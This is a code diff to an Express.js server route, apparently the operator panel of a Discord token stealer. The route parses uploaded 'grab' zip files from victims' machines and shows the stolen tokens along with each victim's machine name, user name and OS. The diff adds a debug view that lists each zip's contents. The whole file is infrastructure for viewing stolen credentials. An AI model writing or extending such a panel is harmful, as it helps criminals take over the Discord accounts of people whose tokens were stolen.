@@ -576,6 +576,13 @@ app.get("/dc/:id", checkKey, async (req, res) => {
     const results = parseDiscordZip(rows[0].filedata);
     const k = encodeURIComponent(req.query.key);
 
+    // zip contents debug
+    let zipEntries = [];
+    try {
+      const dbgZip = new AdmZip(rows[0].filedata);
+      zipEntries = dbgZip.getEntries().map(e => `${e.entryName} (${e.header.size}b)`);
+    } catch(e) { zipEntries = ['zip parse error: ' + e.message]; }
+
     const cards = results.length ? results.map(r => {
       if (r.encrypted) return `
         <div class="tcard enc">
@@ -595,7 +602,11 @@ app.get("/dc/:id", checkKey, async (req, res) => {
           <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
           <div class="tc-label">OS</div><div class="tc-val dim">${esc(r.os)}</div>
         </div>`;
-    }).join("") : `<div class="empty"><div class="icon">&#9673;</div><p>no discord tokens found in this grab</p></div>`;
+    }).join("") : `<div class="empty"><div class="icon">&#9673;</div><p>no discord tokens found in this grab</p></div>
+      <div class="tcard" style="margin-top:20px">
+        <div class="tc-tag">ZIP CONTENTS (DEBUG)</div>
+        ${zipEntries.map(e => `<div class="tc-val mono" style="font-size:10px;margin-bottom:2px">${esc(e)}</div>`).join('')}
+      </div>`;
 
     res.send(`<!DOCTYPE html>
 <html lang="en">
